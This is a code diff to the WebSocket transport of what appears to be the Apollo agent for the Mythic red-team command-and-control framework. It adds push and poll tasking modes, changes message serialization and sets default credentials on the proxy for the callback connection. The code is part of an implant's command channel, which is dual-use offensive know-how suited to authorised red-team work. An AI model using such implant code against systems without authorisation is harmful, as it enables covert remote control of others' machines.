@@ -5,20 +5,15 @@ using System.Text;
 using ApolloInterop.Classes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Structs.MythicStructs;
-using WebSocketSharp;
 using ApolloInterop.Types.Delegates;
 using System.Net;
 using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Constants;
-using System.Threading.Tasks;
 using System.Collections.Concurrent;
 using ST = System.Threading.Tasks;
 using System.Threading;
 using ApolloInterop.Serializers;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
 using WebsocketTransport.Models;
+using WebSocketSharp;
 
 namespace WebsocketTransport
 {
@@ -38,6 +33,7 @@ namespace WebsocketTransport
         private string ProxyPort;
         private string ProxyUser;
         private string ProxyPass;
+        private string TaskingType;
         private string KillDate;
         // synthesis of ProxyHost and ProxyPort
         private string ProxyAddress;
@@ -50,7 +46,7 @@ namespace WebsocketTransport
         private ST.Task agentProcessorTask = null;
         private static JsonSerializer jsonSerializer = new JsonSerializer();
         private static AutoResetEvent senderEvent = new AutoResetEvent(false);
-        private static ConcurrentQueue<IMythicMessage> recieverQueue = new ConcurrentQueue<IMythicMessage>();
+        private static ConcurrentQueue<IMythicMessage> receiverQueue = new ConcurrentQueue<IMythicMessage>();
         private static AutoResetEvent receiverEvent = new AutoResetEvent(false);
         private Action sendAction;
         private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
@@ -62,6 +58,7 @@ namespace WebsocketTransport
             CallbackJitter = double.Parse(data["callback_jitter"]);
             CallbackPort = int.Parse(data["callback_port"]);
             CallbackHost = data["callback_host"];
+            TaskingType = data["tasking_type"];
             Uuid = agent.GetUUID();
             PostUri = data["post_uri"];
             EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
@@ -121,14 +118,15 @@ namespace WebsocketTransport
                     senderEvent.WaitOne();
                     if (senderQueue.TryDequeue(out byte[] result))
                     {
-                        Console.WriteLine("Sending: " + Encoding.UTF8.GetString(result));
+                        Console.WriteLine("Sending:");
+                        Console.WriteLine(Encoding.UTF8.GetString(result));
                         Client.Send(result);
                     }
                 }
             };
         }
 
-        private void Pull()
+        private void Poll()
         {
             agentProcessorTask = new ST.Task(() =>
             {
@@ -153,10 +151,51 @@ namespace WebsocketTransport
                 Agent.Sleep();
             }
         }
+        private void Push()
+        {
+            agentConsumerTask = new ST.Task(() =>
+            {
+                while (Agent.IsAlive())
+                {
+                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
+                    {
+                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
+                        {
+                            AddToSenderQueue(tm);
+                            return true;
+                        }
+                        return false;
+                    }))
+                    {
+                        Thread.Sleep(100);
+                    }
+                }
+            });
+            agentProcessorTask = new ST.Task(() =>
+            {
+                while (Agent.IsAlive())
+                {
+                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
+                    {
+                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
+                    });
+                }
+            });
+            agentConsumerTask.Start();
+            agentProcessorTask.Start();
+            agentProcessorTask.Wait();
+            agentConsumerTask.Wait();
+        }
 
         public void Start()
         {
-            Pull();
+            if (TaskingType == "Poll")
+            {
+                Poll();
+            } else if (TaskingType == "Push")
+            {
+                Push();
+            }
         }
 
 
@@ -175,10 +214,10 @@ namespace WebsocketTransport
             while (Agent.IsAlive())
             {
                 receiverEvent.WaitOne();
-                IMythicMessage msg = recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
+                IMythicMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                 if (msg != null)
                 {
-                    recieverQueue = new ConcurrentQueue<IMythicMessage>(recieverQueue.Where(m => m != msg));
+                    receiverQueue = new ConcurrentQueue<IMythicMessage>(receiverQueue.Where(m => m != msg));
                     return onResp(msg);
                 }
                 if (!Connected)
@@ -208,18 +247,20 @@ namespace WebsocketTransport
             if (Client == null)
             {
                 Client = new WebSocket(Endpoint + PostUri);
+                
 
                 if (!string.IsNullOrEmpty(ProxyAddress))
                 {
-                 
                    Client.SetProxy("http://"+ProxyAddress, ProxyUser, ProxyPass);
                 }
                 else
                 {
                     //TODO TEST
                     // Use Default Proxy and Cached Credentials for Internet Access
+
                     IWebProxy wr = WebRequest.GetSystemWebProxy();
-                    ICredentials cr = CredentialCache.DefaultCredentials;
+                    wr.Credentials = CredentialCache.DefaultCredentials;
+                    //Client.Proxy = wr;
                 }
 
                 Client.ConnectAsync();
@@ -288,7 +329,8 @@ namespace WebsocketTransport
             }
             else
             {
-                m.data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid + jsonSerializer.Serialize(msg)));
+                m.data = Serializer.Serialize(msg);
+                //m.data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid + jsonSerializer.Serialize(msg)));
             }
             string message = jsonSerializer.Serialize(m);
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
@@ -304,27 +346,25 @@ namespace WebsocketTransport
 
         private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
         {
-            Console.WriteLine("OnAsyncMessageReceived");
+            Console.WriteLine("Received:");
             Console.WriteLine(args.Data);
 
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
-
-            string decodedData = Encoding.UTF8.GetString(Convert.FromBase64String(wsm.data)).Substring(36);
 
             if (EncryptedExchangeCheck)
             {
                 if (!_keyExchanged)
                 {
-                    recieverQueue.Enqueue(jsonSerializer.Deserialize<EKEHandshakeResponse>(decodedData));
+                    receiverQueue.Enqueue(Serializer.Deserialize<EKEHandshakeResponse>(wsm.data));
                 }
                 else
                 {
-                    recieverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
+                    receiverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
                 }
             }
             else
             {
-                recieverQueue.Enqueue(jsonSerializer.Deserialize<MessageResponse>(decodedData));
+                receiverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
             }
 
             receiverEvent.Set();
